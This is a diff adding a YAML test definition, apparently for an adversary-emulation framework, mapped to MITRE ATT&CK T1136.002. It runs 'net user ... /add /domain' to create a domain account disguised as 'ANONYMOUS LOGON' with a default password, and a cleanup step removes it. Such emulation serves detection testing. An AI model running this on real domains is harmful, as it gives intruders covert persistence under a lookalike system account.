@@ -1,0 +1,31 @@
+api_version: "2.0"
+name: Create a new account similar to ANONYMOUS LOGON
+description: |
+    Create a new account similar to ANONYMOUS LOGON in a command prompt.
+args:
+    - name: username
+      type: string
+      default: ANONYMOUS  LOGON
+    - name: password
+      type: string
+      default: T1136_pass123!
+uuid: dc7726d2-8ccb-4cc6-af22-0d5afb53a548
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1136: Create Account'
+    subtechniques:
+        - 'T1136.002: Domain Account'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: create-a-new-account-similar-to-anonymous-logon
+      inline: |
+        net user "{{.Args.username}}" "{{.Args.password}}" /add /domain
+      executor: command_prompt
+      cleanup:
+        inline: |
+            net user "{{.Args.username}}" >nul 2>&1 /del /domain
+        executor: command_prompt
